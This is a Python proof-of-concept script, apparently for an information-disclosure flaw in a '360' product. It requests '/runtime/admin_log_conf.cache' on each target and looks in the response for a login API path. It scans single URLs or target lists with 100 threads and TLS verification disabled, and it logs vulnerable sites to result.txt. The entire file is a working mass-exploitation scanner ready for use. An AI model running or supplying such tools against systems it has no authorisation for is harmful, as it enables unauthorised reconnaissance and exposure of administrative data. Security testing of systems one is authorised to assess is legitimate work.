import requests,re,argparse,sys
from multiprocessing.dummy import Pool

def banner():
    test = """                                                            
________   _______________   
\_____  \ /  _____/\   _  \  
  _(__  </   __  \ /  /_\  \ 
 /       \  |__\  \\  \_/   \
/______  /\_____  / \_____  /
       \/       \/        \/ 
          version = 1.0         
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="360存在信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="Please input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp =Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")
def poc(target):
	headers={
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)'
	}
	proxies={
		'http':"http://127.0.0.1:7890",
		'https':"http://127.0.0.1:7890"
	}
	playload="/runtime/admin_log_conf.cache"
	try:
		response = requests.get(url=target+playload,headers=headers,verify=False)
		if '/api/node/login' in response.text:      
			print(f"[+]该站点{target}存在信息泄露漏洞")
			with open("result.txt","a") as fp:
				fp.write(f"{target}"+"\n")
		else:
			print(f"[-]该站点{target}不存在信息泄露漏洞")
	except Exception as e:
		print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ == "__main__":
    main()